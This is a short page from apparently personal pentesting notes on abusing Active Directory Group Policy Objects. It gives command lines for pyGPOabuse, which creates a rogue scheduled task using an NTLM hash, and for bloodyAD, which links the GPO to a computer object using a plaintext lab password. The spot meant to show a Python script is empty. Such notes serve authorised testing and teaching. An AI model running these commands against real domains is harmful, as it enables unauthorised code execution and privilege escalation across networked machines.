---
title: GPO (Group Policy Object)
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/gpo-group-policy-object
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

When you own a object that owns a GPO, you can write to the GPO and link it in the domain.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FChxEQJ8PGPtI0OChDFPz%2Fimage.png?alt=media&amp;token=71978e11-166f-4896-a6e0-7dc200dd94ca" alt=""><figcaption></figcaption></figure>

## Creating a rogue task for the GPO

* You will need to find the GPO id (can be found in bloodhound)
* You will need credentials for the user that controls the GPO

Using pyGPOabuse we can create a task for the GPO:

```
python3 pygpoabuse.py powercorp.local/incendium -hashes :F0529918A0DE5B5B71AB9BBD915B1B01 -gpo-id 'D693F1E4-5666-4259-8BF1-E43CCE1D56F9' -f
```

## Linking GPO

Now that we created a rogue task, we also need to link the GPO to objects. We can do this by remotely by using a Python3 script for example:

Or we can use BloodyAD:

```
bloodyAD -d powercorp.local --host 10.10.1.128 -u incendium -p Incendium123 set object SRV01$ GPLink -v CN={2AADC2C9-C75F-45EF-A002-A22E1893FDB5},CN=POLICIES,CN=SYSTEM,DC=POWERCORP,DC=LOCAL
```
